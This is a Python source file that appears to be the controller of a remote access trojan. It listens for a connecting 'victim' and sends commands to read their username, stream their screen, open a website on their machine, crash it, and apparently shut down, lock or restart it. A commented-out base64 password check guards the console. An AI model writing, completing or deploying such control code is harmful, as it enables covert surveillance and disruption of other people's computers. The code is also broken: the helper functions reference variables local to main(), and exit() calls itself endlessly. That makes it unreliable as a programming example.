import socket
import os
import base64
from vidstream import StreamingServer
import threading
import time

ip = "192.168.178.59"
port=8080
restart = True

"""
passw = input("Enter password: ")
encodedBytes = base64.b64encode(passw.encode("utf-8"))
encodedStr = str(encodedBytes, "utf-8")
workingpass = "c2FwcmF0"

if encodedStr == workingpass:
    os.system("cls")
else:
    exit()
"""

def main():
        sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        address = (ip,port)
        sock.bind(address)
        sock.listen()
        print("[+] listening")
        conn, ipvictim = sock.accept()
        print("[+] Connected")
        while True:
            command = input(str("Command >> "))
            if command == "exit":
                exit()
            elif command == "username":
                username()
            elif command == "screenshare":
                screenshare()
            elif command == "website":
                website()
            elif command == "crash":
                crash()
        conn.close()

def exit():
    conn.send(command.encode())
    exit()



def username():
    conn.send(command.encode())
    newuser = conn.recv(1024)
    print(newuser.decode())



def screenshare():
    conn.send(command.encode())
    sock.close()
    conn.close()
    receiver = StreamingServer("192.168.178.59", 8080)
    t = threading.Thread(target=receiver.start_server)
    t.start()
    while input(" >> ") != "exit":
        continue
    receiver.stop_server()



def website():
    conn.send(command.encode())
    website = input("Website >> ")
    conn.send(website.encode())



def crash():
    conn.send(command.encode())



def shutdown():
    conn.send(command.encode())



def lock():
    conn.send(command.encode())



def restart():
    conn.send(command.encode())
main()
